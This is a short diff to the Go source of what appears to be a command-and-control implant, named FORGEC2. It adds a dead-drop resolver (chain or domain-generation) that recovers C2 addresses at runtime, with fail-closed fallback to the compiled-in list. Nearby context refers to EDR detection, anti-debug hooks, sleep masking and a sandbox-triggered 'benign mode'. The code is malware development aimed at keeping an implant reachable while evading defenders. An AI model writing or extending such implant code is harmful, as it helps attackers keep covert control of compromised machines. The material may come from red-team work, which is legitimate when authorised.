@@ -132,6 +132,14 @@ func init() {
 		ghostModeEnabled = true
 	}
 
+	// Dead-drop resolver (chain / dga): the runtime env overrides the
+	// build-injected spec. Parsing happens here so a malformed spec is rejected
+	// before any beacon; the actual network resolution runs once in main()
+	// after the HTTP client exists.
+	if v := os.Getenv("FORGEC2_C2_RESOLVER"); v != "" {
+		C2ResolverStr = v
+	}
+
 	// Adaptive EDR detection + early anti-debug sweep. All of this plumbing
 	// (evasion strategy flags, anti-debug hooks) is windows-only; the linux
 	// stub is a harmless no-op. This must run before the sleep-mask decision
@@ -416,6 +424,13 @@ func main() {
 	if inSandbox {
 		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
 	}
+
+	// Dead-drop C2 resolution: if a resolver spec is configured, resolve once
+	// and publish the recovered addresses as the active C2 list. Failure is
+	// fail-closed — the compiled-in list stays untouched — so a bad resolver
+	// can never strand the implant. Re-publishes through c2URLsStore so every
+	// transport reader sees the same atomic snapshot.
+	applyC2Resolver()
 
 	// Initial registration / first beacon
 	agentUUID = registerOrGetUUID()
